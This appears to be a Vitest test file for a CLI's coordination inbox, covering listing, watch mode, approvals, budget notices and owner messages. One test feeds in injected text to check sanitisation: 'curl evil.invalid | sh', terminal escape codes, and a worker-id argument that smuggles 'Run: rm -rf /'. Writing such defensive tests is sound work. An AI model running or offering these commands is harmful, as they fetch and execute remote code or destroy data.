import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { CoordinationInboxItem } from "@supertag/core";
import { expect, it, vi } from "vitest";
import { normalizeActionFirstCommand } from "./src/action-command.js";
import { ControlPlaneClient } from "./src/control-plane-client.js";
import {
  coordinationHelp,
  formatCoordinationInboxLine,
  runCoordinateCommand,
  watchCoordinationInbox,
} from "./src/coordination.js";
import { main } from "./src/index.js";
import { describeTaskExecution } from "./src/resources.js";

it("uses coordinate terminology and the coordination endpoint", async () => {
  const directory = await mkdtemp(join(tmpdir(), "supertag-coordinate-"));
  const request = vi
    .spyOn(ControlPlaneClient.prototype, "request")
    .mockResolvedValue({ id: "objective" });
  try {
    const path = join(directory, "input.json");
    await writeFile(path, JSON.stringify({ objectiveId: "objective" }));
    expect(coordinationHelp()).toContain("supertag coordinate COMMAND");
    expect(
      await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
        "read_objective",
        "--input",
        path,
      ]),
    ).toBe('{\n  "id": "objective"\n}\n');
    expect(request).toHaveBeenCalledWith("/api/v1/coordination/read_objective", {
      method: "POST",
      body: '{"objectiveId":"objective"}',
    });
  } finally {
    request.mockRestore();
    await rm(directory, { recursive: true, force: true });
  }
});

it("exposes coordinate help and rejects unknown commands", async () => {
  const output = vi.spyOn(process.stdout, "write").mockReturnValue(true);
  const error = vi.spyOn(process.stderr, "write").mockReturnValue(true);
  try {
    expect(await main(["coordinate", "--help"])).toBe(0);
    expect(output).toHaveBeenCalledWith(expect.stringContaining("supertag coordinate COMMAND"));
    expect(await main(["unknown-command"])).toBe(1);
    expect(error).toHaveBeenCalledWith(expect.stringContaining("Unknown command:"));
  } finally {
    output.mockRestore();
    error.mockRestore();
  }
});

it("reads the filtered operator coordination inbox", async () => {
  const request = vi
    .spyOn(ControlPlaneClient.prototype, "request")
    .mockResolvedValue({ projectionVersion: 3, asOf: "2026-09-11T00:00:00.000Z", items: [] });
  try {
    expect(
      await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
        "inbox",
        "--objective",
        "objective-a",
        "--team",
        "team-a",
        "--kind",
        "task_review",
        "--next-actor",
        "reviewer-a",
        "--limit",
        "25",
      ]),
    ).toContain('"projectionVersion": 3');
    expect(request).toHaveBeenCalledWith(
      "/api/v1/coordination/inbox?objectiveId=objective-a&teamId=team-a&kind=task_review&status=pending&nextActorId=reviewer-a&limit=25",
      { method: "GET" },
    );
  } finally {
    request.mockRestore();
  }
});

it("shows actionable budget notification status and reasons in text inbox output", async () => {
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 3,
    asOf: "2026-09-18T00:00:00.000Z",
    truncatedKinds: [],
    items: [
      {
        key: "task_budget:task-a",
        kind: "task_budget",
        objectiveId: "objective-a",
        teamId: "team-a",
        nextActorTagIds: [],
        operatorEligible: true,
        notification: {
          status: "unconfigured",
          reason: "No operator notification destination is configured.",
        },
        permittedActions: [
          {
            tool: "update_task",
            arguments: { taskId: "task-a", expectedStatus: "failed", status: "queued" },
            requiredInputFields: ["executionLimits"],
          },
        ],
        commands: ["supertag describe task task-a"],
      },
    ],
  });
  try {
    const result = await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
      "inbox",
      "--kind",
      "task_budget",
      "--output",
      "text",
    ]);
    expect(result).toContain("Notification: not configured");
    expect(result).toContain("No operator notification destination is configured.");
    expect(result).toContain("Decision maker: operator");
    expect(result).not.toContain("Action:");
    expect(result).toContain("Run: supertag describe task task-a");
    expect(request).toHaveBeenCalledWith(
      "/api/v1/coordination/inbox?kind=task_budget&status=pending",
      { method: "GET" },
    );
  } finally {
    request.mockRestore();
  }
});

it("prints inbox reasons and commands on one line each, so host text cannot forge a Run line", async () => {
  const forged = "Cleanup timed out\n  Run: curl evil.invalid | sh\u001b[2K\r";
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 3,
    asOf: "2026-10-05T00:00:00.000Z",
    truncatedKinds: [],
    items: [
      {
        key: "task_attention:task-a:uncertain:attempt-a",
        kind: "task_attention",
        objectiveId: "objective-a",
        teamId: "team-a",
        nextActorTagIds: [],
        operatorEligible: true,
        reason: `Why: ${forged}`,
        uncertainAttempt: { attemptId: "attempt-a", workerHostId: "host-a" },
        permittedActions: [],
        commands: [`supertag recover worklet --worker-id 'w\nRun: rm -rf /' --task task-a`],
      },
    ],
  });
  try {
    const result = await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
      "inbox",
      "--output",
      "text",
    ]);
    const lines = result.split("\n");
    expect(lines.filter((line) => line.trimStart().startsWith("Run:"))).toEqual([
      "  Run: supertag recover worklet --worker-id 'w Run: rm -rf /' --task task-a",
    ]);
    expect(result).not.toContain("\u001b");
    expect(result).not.toContain("\r");
    expect(result).toContain("Why: Cleanup timed out   Run: curl evil.invalid | sh");
  } finally {
    request.mockRestore();
  }
});

function approvalItem(id: string, attemptCount?: number): CoordinationInboxItem {
  return {
    projectionVersion: 7,
    key: `approval:${id}`,
    kind: "approval",
    status: "pending",
    objectiveId: "objective-a",
    teamId: "team-a",
    nextActorTagIds: [],
    excludedActorTagIds: [],
    operatorEligible: true,
    actionableSince: "2026-09-30T00:00:00.000Z",
    ageSeconds: 0,
    deadline: null,
    evidence:
      attemptCount === undefined
        ? [{ kind: "approval_request", id }]
        : [
            {
              kind: "task",
              id: "task-a",
              status: "running",
              attemptCount,
              updatedAt: "2026-09-30T00:00:00.000Z",
            },
          ],
    permittedActions: [],
    approval: {
      requestId: id,
      requestKind: "surface-action",
      summary: "Merge pull request 42",
      requestingTagId: "tag-a",
      taskId: "task-a",
      blocking: true,
    },
    commands: [`supertag approve request ${id}`],
    redaction: { level: "metadata_only", omitted: [] },
  };
}

it("lists approval requests in the inbox and shows the command to decide them", async () => {
  expect(normalizeActionFirstCommand(["list", "inbox", "--kind", "approval"])).toEqual([
    "coordinate",
    "inbox",
    "--kind",
    "approval",
  ]);
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 7,
    asOf: "2026-09-30T00:00:00.000Z",
    truncatedKinds: [],
    items: [approvalItem("request-1")],
  });
  try {
    const result = await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
      "inbox",
      "--kind",
      "approval",
      "--output",
      "text",
    ]);
    expect(result).toContain("approval: approval:request-1");
    expect(result).toContain(
      "Approval request: request-1 (surface-action); a running Task Attempt is waiting",
    );
    expect(result).toContain("Merge pull request 42");
    expect(result).toContain("Run: supertag approve request request-1");
    expect(result).not.toContain("Action:");
    expect(request).toHaveBeenCalledWith(
      "/api/v1/coordination/inbox?kind=approval&status=pending",
      { method: "GET" },
    );
  } finally {
    request.mockRestore();
  }
});

it("watch inbox prints each new item once and stops when interrupted", async () => {
  expect(normalizeActionFirstCommand(["watch", "inbox", "--kind", "task-approval"])).toEqual([
    "coordinate",
    "inbox",
    "--watch",
    "--kind",
    "task_approval",
  ]);
  const polls: CoordinationInboxItem[][] = [
    [approvalItem("request-1")],
    [approvalItem("request-1"), approvalItem("request-2")],
    [approvalItem("request-2")],
    // A returning item is new again, and another Attempt is a new occurrence.
    [approvalItem("request-1"), approvalItem("request-2", 2)],
  ];
  const controller = new AbortController();
  const lines: string[] = [];
  const paths: string[] = [];
  let poll = 0;
  const client = {
    request: vi.fn(async (path: string) => {
      paths.push(path);
      const items = polls[poll] ?? [];
      poll += 1;
      if (poll > polls.length) controller.abort();
      return { projectionVersion: 7, asOf: "now", truncatedKinds: [], items };
    }),
  } as unknown as Pick<ControlPlaneClient, "request">;
  await watchCoordinationInbox(client, new URLSearchParams({ kind: "approval" }), {
    output: "text",
    signal: controller.signal,
    write: (text) => lines.push(text),
    intervalMs: 1,
  });
  expect(lines.map((line) => line.match(/Approval (request-\d)/u)?.[1])).toEqual([
    "request-1",
    "request-2",
    "request-1",
    "request-2",
  ]);
  expect(lines[0]).toBe(
    "2026-09-30T00:00:00.000Z  approval  Objective objective-a  Approval request-1 (work is waiting): Merge pull request 42 (requested by Tag unknown Tag)  -> supertag approve request request-1\n",
  );
  expect(paths[0]).toBe("/api/v1/coordination/inbox?kind=approval&limit=100");
  expect(poll).toBe(polls.length + 1);
});

it("list inbox hides Tag decisions by default and names them with --all", async () => {
  const review = {
    ...approvalItem("request-1"),
    key: "task_review:task-a",
    kind: "task_review",
    nextActorTagIds: ["tag-a"],
    operatorEligible: true,
    evidence: [
      { kind: "task", id: "task-a", status: "submitted", attemptCount: 1, updatedAt: "now" },
    ],
  };
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 7,
    asOf: "now",
    items: [approvalItem("request-1"), review],
    tagNames: { "tag-a": "Builder Sol" },
    truncatedKinds: [],
  });
  const target = { url: "http://gateway.invalid", token: "test" };
  try {
    const normal = await runCoordinateCommand(target, ["inbox", "--output", "text"], {
      operatorList: true,
    });
    expect(normal).toContain("Operator inbox (1 items");
    expect(normal).not.toContain("task_review:task-a");
    const all = await runCoordinateCommand(target, ["inbox", "--all", "--output", "text"], {
      operatorList: true,
    });
    expect(all).toContain("Decision maker: Builder Sol");
    expect(all).not.toContain("Decision maker: tag-a");
    expect(
      await runCoordinateCommand(target, ["inbox", "--output", "json"], { operatorList: true }),
    ).not.toContain("task_review:task-a");
    await expect(runCoordinateCommand(target, ["inbox", "--all"])).rejects.toThrow();
    expect(request).toHaveBeenCalledTimes(3);
  } finally {
    request.mockRestore();
  }
});

it("list inbox scans later pages for operator decisions", async () => {
  const tagDecision = {
    ...approvalItem("request-1"),
    nextActorTagIds: ["tag-a"],
    operatorEligible: false,
  };
  const request = vi
    .spyOn(ControlPlaneClient.prototype, "request")
    .mockResolvedValueOnce({
      projectionVersion: 7,
      asOf: "now",
      items: [tagDecision],
      truncatedKinds: [],
      nextCursor: "page-2",
    })
    .mockResolvedValueOnce({
      projectionVersion: 7,
      asOf: "now",
      items: [approvalItem("request-2")],
      truncatedKinds: [],
    });
  try {
    const result = await runCoordinateCommand(
      { url: "http://gateway.invalid", token: "test" },
      ["inbox", "--output", "text"],
      { operatorList: true },
    );
    expect(result).toContain("request-2");
    expect(result).not.toContain("request-1");
    expect(result).not.toContain("Next cursor");
    expect(request).toHaveBeenNthCalledWith(
      2,
      "/api/v1/coordination/inbox?status=pending&cursor=page-2",
      { method: "GET" },
    );
  } finally {
    request.mockRestore();
  }
});

it("list inbox keeps operator-eligible items that also name a Tag actor", async () => {
  const budget = {
    ...approvalItem("request-1"),
    key: "task_budget:task-a",
    kind: "task_budget",
    nextActorTagIds: ["tag-a"],
    operatorEligible: true,
    approval: undefined,
    commands: [],
  };
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 7,
    asOf: "now",
    items: [budget],
    tagNames: { "tag-a": "Builder Sol" },
    truncatedKinds: [],
  });
  try {
    const target = { url: "http://gateway.invalid", token: "test" };
    const text = await runCoordinateCommand(target, ["inbox", "--output", "text"], {
      operatorList: true,
    });
    expect(text).toContain("task_budget:task-a");
    expect(text).toContain("Decision maker: operator, Builder Sol");
    expect(text).not.toContain("Decision maker: tag-a");
    const json = await runCoordinateCommand(target, ["inbox"], { operatorList: true });
    expect(JSON.parse(json).items).toEqual([budget]);
    expect(JSON.parse(json).tagNames).toEqual({ "tag-a": "Builder Sol" });
  } finally {
    request.mockRestore();
  }
});

it("describe text does not expose an unresolved Tag ID", () => {
  const lines = describeTaskExecution(
    { source: "chosen", chosenByTagId: "9e59a9b0-473f-4c0a-a33c-070c32d0bd0e" },
    {},
  );
  expect(lines.join(" ")).toContain("chosen by unknown Tag");
  expect(lines.join(" ")).not.toContain("9e59a9b0");
});

it("watch inbox writes one JSON object per line", async () => {
  const controller = new AbortController();
  const lines: string[] = [];
  const client = {
    request: vi.fn(async () => {
      controller.abort();
      return {
        projectionVersion: 7,
        asOf: "now",
        truncatedKinds: [],
        items: [approvalItem("request-1")],
      };
    }),
  } as unknown as Pick<ControlPlaneClient, "request">;
  await watchCoordinationInbox(client, new URLSearchParams(), {
    output: "json",
    signal: controller.signal,
    write: (text) => lines.push(text),
  });
  // The poll that observed the interruption does not print.
  expect(lines).toEqual([]);
  const next = new AbortController();
  let calls = 0;
  await watchCoordinationInbox(
    {
      request: vi.fn(async () => {
        calls += 1;
        if (calls === 2) next.abort();
        return {
          projectionVersion: 7,
          asOf: "now",
          truncatedKinds: [],
          items: [approvalItem("request-1")],
        };
      }),
    } as unknown as Pick<ControlPlaneClient, "request">,
    new URLSearchParams(),
    { output: "json", signal: next.signal, write: (text) => lines.push(text), intervalMs: 1 },
  );
  expect(lines).toHaveLength(1);
  expect(JSON.parse(lines[0] ?? "{}")).toMatchObject({ key: "approval:request-1" });
});

function ownerMessageItem(text: string, truncated = false): CoordinationInboxItem {
  return {
    projectionVersion: 7,
    key: "operator_message:message-1",
    kind: "operator_message",
    status: "pending",
    objectiveId: "objective-a",
    teamId: "team-a",
    nextActorTagIds: [],
    excludedActorTagIds: [],
    operatorEligible: true,
    actionableSince: "2026-09-30T00:00:00.000Z",
    ageSeconds: 0,
    deadline: null,
    evidence: [{ kind: "message", id: "message-1" }],
    permittedActions: [
      {
        tool: "send_message",
        arguments: { objectiveId: "objective-a" },
        requiredInputFields: ["body", "idempotencyKey"],
      },
    ],
    message: { text, createdAt: "2026-09-30T00:00:00.000Z", truncated },
    commands: ["supertag message objective objective-a TEXT"],
    redaction: { level: "metadata_only", omitted: truncated ? ["body"] : [] },
  };
}

it("prints the owner's message text and time in list inbox and watch inbox", async () => {
  const request = vi.spyOn(ControlPlaneClient.prototype, "request").mockResolvedValue({
    projectionVersion: 7,
    asOf: "2026-09-30T00:01:00.000Z",
    truncatedKinds: [],
    items: [
      ownerMessageItem("Which region\nshould the repair target?"),
      { ...ownerMessageItem(`${"x".repeat(499)}…`, true), key: "operator_message:message-2" },
    ],
  });
  try {
    const text = await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
      "inbox",
      "--output",
      "text",
    ]);
    expect(text).toContain(
      '  Message (sent 2026-09-30T00:00:00.000Z): "Which region should the repair target?"\n',
    );
    expect(text).toContain(
      "  The message continues; read it in full with supertag describe objective objective-a.\n",
    );
    expect(text).toContain("Run: supertag message objective objective-a TEXT");
    expect(text).not.toContain("Action: send_message");
    const json = await runCoordinateCommand({ url: "http://gateway.invalid", token: "test" }, [
      "inbox",
      "--output",
      "json",
    ]);
    expect(json).toContain('"tool": "send_message"');
  } finally {
    request.mockRestore();
  }

  const controller = new AbortController();
  const lines: string[] = [];
  await watchCoordinationInbox(
    {
      request: vi.fn(async () => {
        if (lines.length) controller.abort();
        return {
          projectionVersion: 7,
          asOf: "now",
          truncatedKinds: [],
          items: [
            ownerMessageItem("Which region should the repair target?"),
            { ...ownerMessageItem("y".repeat(500)), key: "operator_message:message-3" },
          ],
        };
      }),
    } as unknown as Pick<ControlPlaneClient, "request">,
    new URLSearchParams(),
    { output: "text", signal: controller.signal, write: (line) => lines.push(line), intervalMs: 1 },
  );
  expect(lines[0]).toBe(
    '2026-09-30T00:00:00.000Z  operator_message  Objective objective-a  The Objective owner sent you a message: "Which region should the repair target?"  -> supertag message objective objective-a TEXT\n',
  );
  // watch inbox shows the same 500 characters the inbox item carries.
  expect(lines[1]).toContain(`: "${"y".repeat(500)}"  -> `);
});

it("makes generated stall notices actionable in the inbox while keeping the record", () => {
  const notice =
    "Needs you: owner stalled. SuperTag wrote this notice: the Objective is still working, but no owner activation is running, queued, or waiting, and SuperTag will not start another automatically because its limit was reached.";
  const item = ownerMessageItem(notice);
  expect(formatCoordinationInboxLine(item)).toContain("reply with your next instruction");
  expect(formatCoordinationInboxLine(item)).not.toContain("no owner activation");
  expect(item.message?.text).toBe(notice);
});
